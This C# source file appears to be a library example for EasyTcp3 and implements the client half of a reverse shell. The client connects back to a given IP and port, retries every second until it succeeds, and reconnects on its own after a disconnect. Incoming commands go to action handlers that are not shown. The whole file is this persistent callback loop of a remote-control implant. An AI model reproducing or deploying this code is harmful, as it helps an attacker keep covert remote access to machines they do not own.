using System.Threading.Tasks;
using EasyTcp3.Actions;
using EasyTcp3.ClientUtils;
using EasyTcp3.ClientUtils.Async;

namespace EasyTcp3.Examples.ReverseShell.Client
{
    /// <summary>
    /// Example reverse shell with EasyTcp & EasyTcp.Actions
    /// </summary>
    public class ReverseShellClient
    {
        /// <summary>
        /// Time between connect attempts
        /// </summary>
        private const int ConnectTimeout = 1_000;

        public async Task Start(string ip, ushort port)
        {
            // Use namespace filter to only get the actions of this client
            using var client = new EasyTcpActionClient(nameSpace: "EasyTcp3.Examples.ReverseShell.Client.Actions");
            client.OnUnknownAction += (s, m) => client.Send("Unknown action");
            client.OnError += (s, e) => client.Send($"Client error: {e.Message}");
            client.OnDisconnect += async (s, c) => await Start(ip, port);
            
            while (!await client.ConnectAsync(ip, port)) await Task.Delay(ConnectTimeout);
            await Task.Delay(-1);
        }
    }
}